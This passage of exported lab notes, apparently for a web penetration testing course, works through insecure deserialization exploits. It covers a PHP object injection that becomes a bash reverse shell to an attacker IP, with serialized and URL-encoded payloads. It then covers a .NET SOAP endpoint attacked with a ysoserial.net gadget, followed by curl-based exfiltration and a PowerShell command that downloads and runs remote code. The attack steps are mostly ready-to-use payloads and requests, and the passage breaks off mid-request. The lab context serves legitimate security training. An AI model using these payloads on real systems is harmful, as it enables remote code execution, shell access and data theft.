</code></pre><p id="89e13132-9726-476d-a4ca-aae59ef9476a" class="">Serialized payload:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c4b76e27-4d95-4a28-99dd-d57d52075af9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">O:18:&quot;PHPObjectInjection&quot;:1:{s:6:&quot;inject&quot;;s:17:&quot;system(&#x27;ps aux&#x27;);&quot;;}
</code></pre><p id="708c9fdd-8804-4ebd-a56b-6320ecb09837" class="">Assign the generated value in the <strong>r</strong> parameter in the URL:</p><p id="06d87961-1eae-421e-9a87-eeb91c0aedf0" class="">The process listing is retrieved, as shown in the above image.</p><p id="91782e4c-02e2-49f0-aaaf-0294234bb022" class="">Check the page source for a better-formatted response (press CTRL+U):</p><p id="2fc31b00-a48a-4d03-9bcd-33eb718f682c" class="">Step 10: Obtain a reverse shell.</p><p id="615d3795-67e3-488e-b37a-7aaa37bb54cd" class="">Running single commands is good, but it requires us to generate the serialized value every time.</p><blockquote id="63a98cd8-eff8-4291-aabe-01ceb25472bb" class="">Let’s get a reverse shell to avoid that.</blockquote><p id="4b50b57b-0eb7-4c00-8f40-1c4d4c4f25e7" class="">Before moving on to the payload generation part, retrieve the IP address of the attacker machine:</p><p id="d117976b-320a-4840-ac0c-45d88c1d643f" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ec184a5d-1858-44a0-b882-445b9d3b8d8d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ip addr
</code></pre><p id="90c7a18b-11d9-46bb-bce4-633b42a62e92" class="">The IP address of the attacker machine is 192.222.13.2</p><blockquote id="9d99e1d2-f627-4667-b71d-b4346805a6fb" class="">[Note] The IP address is bound to change with every lab run. Kindly make sure to replace the IP address used in the payload. Otherwise, the payload wouldn’t work.</blockquote><p id="33e3f475-c811-4f91-802d-e4c72daa708d" class="">Save the following code snippet as object.php</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a63de7c0-edf2-4b8a-bb16-5df2ffc29735" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?php
class PHPObjectInjection {
    public $inject = &quot;system(&#x27;/bin/bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/192.222.13.2/54321 0&gt;&amp;1\&#x27;&#x27;);&quot;;
}

$obj = new PHPObjectInjection();
var_dump(serialize($obj));
?&gt;

</code></pre><p id="79516ff0-14be-4f3c-b665-6fa01f6b8447" class="">Serialize the object:</p><p id="36413816-2387-4235-9a4a-56eb0c11078c" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="335a5691-7927-4476-bd09-e525ec0a7461" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">php object.php
</code></pre><p id="574be21d-11b1-46b5-8f75-2896f6ea68f1" class="">Serialized payload:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cb50e814-03db-4c41-98db-dff6cef6c6f6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">O:18:&quot;PHPObjectInjection&quot;:1:{s:6:&quot;inject&quot;;s:71:&quot;system(&#x27;/bin/bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/192.222.13.2/54321 0&gt;&amp;1\&#x27;&#x27;);&quot;;}
</code></pre><p id="7b9f1ba5-6c2f-42c2-b9ea-9532832e6c7a" class="">Start a Netcat listener on port 54321 (since we specified this port in the reverse shell payload as well):</p><p id="dc375675-9c7b-4250-8819-e8968142c7e6" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0d161b83-5f30-4115-bd4c-12a7571d4596" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nc -lvp 54321
</code></pre><p id="ea9a53d0-d36d-49f3-8819-1db72cf4432e" class="">Assign the generated value in the <strong>r</strong> parameter in the URL:</p><p id="0048433b-29b1-4777-850b-2c01367ed83e" class="">It didn’t work. But why is that?</p><p id="6177ba86-d5d1-46b1-a6a9-20373ab3e447" class="">It is because the serialized payload contains characters like <strong>/</strong> and <strong>&amp;</strong> which are treated specially by the web browser and the server.</p><blockquote id="7bb29aaa-a5bd-4121-a4f7-906a77d039e5" class="">To avoid that, we will encode the serialized payload.</blockquote><p id="fb00c5a6-e673-4e77-8ef0-5dcb782e5e50" class="">You can use Burp to do that or use websites like https://www.url-encode-decode.com/ to get the job done:</p><p id="faa3e0d4-7a56-4f23-88ba-ea70f5b58707" class="">URL-encoded serialized payload:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="11501dd7-2e16-46a4-968f-9f579711b006" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A71%3A%22system%28%27%2Fbin%2Fbash+-c+%5C%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.222.13.2%2F54321+0%3E%261%5C%27%27%29%3B%22%3B%7D
</code></pre><blockquote id="274cec29-204c-4879-a276-7ff4e93f5c39" class="">[Note] Make sure not to copy this payload as is, since the IP would be different for the attacker machine assigned to you.</blockquote><p id="4bed6585-3b49-4d3a-b631-943e5ce50703" class="">Assign the URL-encoded payload in the <strong>r</strong> parameter in the URL:</p><p id="7d01f678-4e98-43ec-bf95-be0923a228a7" class="">Check the terminal where the Netcat listener was running:</p><blockquote id="3e6d4218-806b-4d5f-a50e-68007eac97f3" class="">We have gained a reverse shell!</blockquote><p id="26127b03-ca77-4224-a906-c21c15aee606" class="">Now we can run commands without having to generate command payloads every single time:</p><p id="e16af038-891f-472c-8e02-080823b1a7d5" class="">Commands:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9a77ab46-82d7-4654-9f94-5b5ea17302b2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">id
pwd
ls -al
</code></pre><p id="ed99f7d8-7dd7-4e84-8760-7ce42969a717" class="">With that, we conclude this lab on Insecure PHP Deserialization also known as PHP Object Injection.</p><blockquote id="7c8299ec-53dc-464c-b583-5c96b541cbfe" class="">We learned about serialization and deserialization, how to generate serialized values, and how to unserialize them. We also reviewed the PHP code and uncovered the use of a code execution sink, namely the eval function.</blockquote><blockquote id="7667b7b9-a3b8-4c59-a9ee-3c36f2b630fe" class="">Finally, we exploited the vulnerable code by generating malicious serialized objects to gain command execution on the target server.</blockquote><p id="1b27a853-d1d2-4b97-992a-d8c99349f13c" class="">References:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c329411f-3921-4002-9c09-4cb718af05d3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- XVWA = https://github.com/s4n7h0/xvwa
- PHP Associative Arrays = https://www.w3schools.com/PHP/php_arrays_associative.asp
- PHP Serialize = https://www.php.net/manual/en/function.serialize.php
- PHP Unserialize = https://www.php.net/manual/en/function.unserialize.php
</code></pre><h2 id="8d8919ef-7ee7-42a3-9b2d-bf4e7b1c42a3" class=""><strong>Lab 4</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#lab-4"></a></strong></h2><p id="f4838e50-d2f4-4da4-b556-e5a04bb196ae" class="">Solutions</p><p id="28db14c1-4ab9-4f44-ada5-f8e0b5b1506f" class="">Below, you can find solutions for each task. Remember though, that you can follow your own strategy, which may be different from the one explained in the following lab.</p><p id="a6389e65-d4d7-4f48-bc20-8409bdb46641" class="">Task 1. Perform reconnaissance and find a soap-based web service</p><p id="b4a27c2c-8a63-4979-a191-dc903c25cee7" class="">A port scan reveals two possible candidates (see below).</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ddfc1f3f-90ec-44dc-9cd5-cb02a34c0861" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nmap -sV -p- demo.ine.local -T4 --open -v -Pn
</code></pre><p id="773b6a57-68c6-4bcb-832b-2356dbeafc78" class="">The results are:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cdf56019-b7b1-426c-8aa8-44f6d0814d8c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Not shown: 62690 closed tcp ports (reset), 2831 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1234/tcp  open  http               MS .NET Remoting httpd (.NET CLR 4.0.30319.42000)
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
49192/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
</code></pre><p id="b6600426-d96d-4a1d-bdea-1b727b606fc4" class="">Examining the service on port 80 shows a frame that fails to be loaded.</p><p id="95be58a5-7226-4688-9e10-6618be6af7ef" class="">The service on port 1234 reacts to a simple SOAP message.</p><blockquote id="1d07779c-a2c4-430e-a878-021087a09a91" class="">[Note] That it is a valid service endpoint, since when requesting an incorrect path the error mentions Requested Service not found.</blockquote><p id="c9628e7d-1ea2-45eb-8b2f-ff8a981ba7e2" class="">Task 2. Execute code on remote machine</p><p id="6ecf91b4-339d-4496-8790-490bf17eddc5" class="">Lets use ysoserial.net to generate a payload in SoapFormat, in an attempt to identify if the remote service is vulnerable.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4525d149-27c5-47b5-95d4-871697ea1dfd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Note that you might need to remove \&lt;SOAP:Body&gt; tags from the resulting payload before testing.
</code></pre><p id="bf10bb58-402a-4b68-9b04-bc904daae00b" class="">Also note that you need a Windows OS on which you will run the ysoserial.net binary with the below command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7208f0fa-a3ba-47b0-9a42-e485203750cb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c &quot;cmd /c [command]&quot; -o raw
</code></pre><p id="7a8cffbd-24b7-4b97-9141-fe53eb6ac700" class="">The .NET serialization protocol in this case does not verify the length of the command string, it will thus be possible to interfere with it after generating the payload. The payload is then copied to Burp with the following changes:</p><ul id="32ef69d1-544d-48ad-a9c3-b8d3a3a2d835" class="bulleted-list"><li style="list-style-type:disc">As said before, Soap Body tags should be removed</li></ul><ul id="74b02a30-289b-4b3a-80e5-d3846c95df66" class="bulleted-list"><li style="list-style-type:disc">In order to have a valid soap message, a dummy SOAPAction header is required. This is related to SOAP and not related to this specific lab</li></ul><ul id="1be6eee8-2345-4f6a-8e67-032d261982ea" class="bulleted-list"><li style="list-style-type:disc">The content type should be text/xml like in every SOAP request</li></ul><ul id="ce3d1eb0-d97e-4cb3-a0bd-e14cf1606d1a" class="bulleted-list"><li style="list-style-type:disc">If you are receiving an error stating <strong>Requested service was not found</strong>, you might also need to clear some whitespaces / newlines</li></ul><p id="4a3c929b-cdeb-4404-87c1-f9ee176d9555" class="">Blind Code execution can be confirmed, for example, using ping.</p><p id="dfe9713d-2758-4232-8400-2fde00585406" class="">For that, we need the IP address of the attacker machine:</p><p id="c4815080-aa21-4332-8c08-73dd79598366" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b2637662-1dd5-44d0-8590-97ffe174e7e9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ip addr
</code></pre><p id="290a7af9-2325-431e-b7e1-3e07a2585bb6" class="">Request:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c0b05726-3c15-4b41-aa15-5d60f16fbaf8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">POST /VulnerableEndpoint.rem HTTP/1.1
Host: demo.ine.local:1234
SOAPAction: something
Content-type: text/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://demo.ine.local/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 1478

&lt;SOAP-ENV:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
                   xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
                   xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;
                   xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;
                   xmlns:clr=&quot;http://schemas.microsoft.com/soap/encoding/clr/1.0&quot;
                   SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
  &lt;a1:TextFormattingRunProperties id=&quot;ref-1&quot;
                                  xmlns:a1=&quot;http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35&quot;&gt;
    &lt;ForegroundBrush id=&quot;ref-3&quot;&gt;
      &amp;lt;ResourceDictionary
        xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;
        xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;
        xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot;
        xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&amp;gt;
        &amp;lt;ObjectDataProvider x:Key=&quot;&quot; ObjectType=&quot;{x:Type Diag:Process}&quot; MethodName=&quot;Start&quot; &amp;gt;
          &amp;lt;ObjectDataProvider.MethodParameters&amp;gt;
            &amp;lt;System:String&amp;gt;cmd&amp;lt;/System:String&amp;gt;
            &amp;lt;System:String&amp;gt;&quot;/c ping 10.10.27.2&quot;&amp;lt;/System:String&amp;gt;
          &amp;lt;/ObjectDataProvider.MethodParameters&amp;gt;
        &amp;lt;/ObjectDataProvider&amp;gt;
      &amp;lt;/ResourceDictionary&amp;gt;
    &lt;/ForegroundBrush&gt;
  &lt;/a1:TextFormattingRunProperties&gt;
&lt;/SOAP-ENV:Envelope&gt;


</code></pre><blockquote id="731fed81-08dc-4582-82a9-8e0eea6b366e" class="">[Note] Make sure to place the IP address of your attacker machine in the above command.</blockquote><p id="89c6a262-3493-4aee-84dc-3b43276b3a5e" class="">Before sending the above request, use the following command to listen for ICMP requests/replies:</p><p id="f83cee79-99b6-4b1c-9287-a62428d86987" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6b0f508b-1d24-49f4-ae19-806ddb66f0c1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">tcpdump -i any icmp
</code></pre><p id="e9a40486-df1b-4f45-a8df-0666a07994ea" class="">Send the request to the vulnerable SOAP endpoint:</p><p id="1d63123b-ee7a-4ac6-b4e1-ab224718af71" class="">By the time the crafted request is sent, we can notice ICMP traffic reaching our sniffer from the remote target!</p><p id="24e0b2e9-d111-497c-99d3-a1104b90803d" class="">Task 3. Get command output using an out-of-band channel</p><p id="7c19763c-cd6c-49f7-aeed-0020f7dbdf8c" class="">There are many methods to achieve that goal. We will do the task using PowerShell. First, we will create the following snippet and then host it using Python’s SimpleHTTPServer module.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aa7b7cb3-3794-4a30-8fcc-7577b17f97e7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$c=whoami;curl http://10.10.27.2:445/$c
python3 -m http.server 445
</code></pre><blockquote id="f2be44f8-1f59-4bbf-bcb7-fec25eef2f88" class="">[Note] Make sure to place the IP address of your attacker machine in the above command.</blockquote><p id="fcf397b9-70ea-4b12-babf-b72ae0e32d4e" class="">And finally, the following command is injected into the serialized payload:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d27f804-e485-4062-824f-f579dc0b1273" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">powershell -exec Bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.27.2:445/payload.txt&#x27;)&quot;
</code></pre><blockquote id="adba9685-f4e6-4089-8f11-7345502b3c7e" class="">[Note] Make sure to place the IP address of your attacker machine in the above command.</blockquote><p id="aca88d77-2126-48d5-b7ae-ee6339dbcaca" class="">The request for out-of-band data exfiltration via command execution is:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="911f1e28-e2ff-4935-9f1c-7d22ea391539" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">POST /VulnerableEndpoint.rem HTTP/1.1
Host: demo.ine.local:1234
SOAPAction: something
Content-type: text/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://demo.ine.local/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 1478

&lt;SOAP-ENV:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
